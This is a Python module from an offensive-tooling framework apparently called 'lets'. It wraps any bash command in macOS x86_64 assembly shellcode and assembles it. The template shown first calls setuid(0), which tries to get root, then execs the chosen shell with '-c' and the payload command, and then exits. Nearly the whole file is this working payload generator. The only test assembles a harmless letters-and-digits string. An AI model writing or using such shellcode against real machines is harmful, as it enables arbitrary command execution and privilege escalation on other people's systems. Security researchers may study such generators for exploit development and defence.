from lets.module import Module
from lets.extensions.assembly import AssemblyExtension

# Imports required to execute this module
import string


class X64(AssemblyExtension, Module):
    """
    Format a bash command into OSX x86_64 assembly code.
    """

    def usage(self) -> object:
        """
        Configure an ArgumentParser object with options relevant to the module.

        :return: ArgumentParser object
        """
        parser = super().usage()

        # Customize shell
        parser.add_argument("-s", "--shell",
            help="use the specified shell",
            type=str,
            default="/bin/bash")

        return parser

    def do(self, data:bytes=None, options:dict=None) -> bytes:
        """
        Main functionality.

        Module.do updates self.options with options.

        :param data: Data to be used by module, in bytes
        :param options: Dict of options to be used by module
        :return: Generator containing results of module execution, in bytes
        """
        super().do(data, options)

        # Validate input
        try:
            assert data, "Expecting data"
            assert "shell" in self.options and len(self.options.get("shell")) > 0, "Shell required"
        except AssertionError as e:
            self.throw(e)

        # Build variables
        self.options["sys_setuid_x64"] = 0x2000017
        self.options["sys_execve_x64"] = 0x200003b
        self.options["sys_exit_x64"] = 0x2000001
        self.options["shell_hex"] = ",".join([hex(byte) for byte in self.options.get("shell").encode()])
        self.options["data_hex"] = ",".join([hex(byte) for byte in data])

        # Build code
        code = """
    jmp get_payload         ; Retrieve pointer to payload
got_payload:
    pop rsi                 ; Save pointer to payload in rsi

x64:
    xor rbx, rbx            ; Zero out rbx

; 0x2000017: int setuid(uid_t uid)

    xor rdi, rdi            ; Set uid_t uid (NULL)
    mov rax, %(sys_setuid_x64)i ; Prepare sys_setuid
    syscall                 ; Call sys_setuid

; 0x200003b: int execve(const char *path, char *const argv[], char *const envp[])

    xor rdx, rdx            ; Set char *const envp[] (NULL)
    push rdx                ; Terminate pointer array
    push rsi                ; Push pointer to payload
    call get_c              ; Push pointer to "-c", 0x00
    .byte 0x2d,0x63,0x00
get_c:
    call get_shell          ; Push pointer to shell
    .byte %(shell_hex)s,0x00
get_shell:
    mov rdi, [rsp]          ; Set const char *path (shell)
    mov rsi, rsp            ; Set char *const argv[] ({shell, "-c", payload, NULL})
    mov rax, %(sys_execve_x64)i ; Prepare sys_execve
    syscall                 ; Call sys_execve
    add rsp, 32             ; Fix stack (array[4])

; 0x2000001: void exit(int status)

    mov rax, %(sys_exit_x64)i   ; Prepare sys_exit
    syscall                 ; Call sys_exit

get_payload:
    call got_payload        ; Push pointer to payload

payload:
    .byte %(data_hex)s,0x00
""" % self.options

        # Assemble code
        yield self.assemble(code, arch="X86", mode="64")

    def test(self):
        """
        Perform unit tests to verify this module's functionality.
        """
        # Test assembly
        self.assertTrue(
            len(b"".join(self.do((string.ascii_letters + string.digits).encode()))) > 0,
            "Unable to assemble code"
            )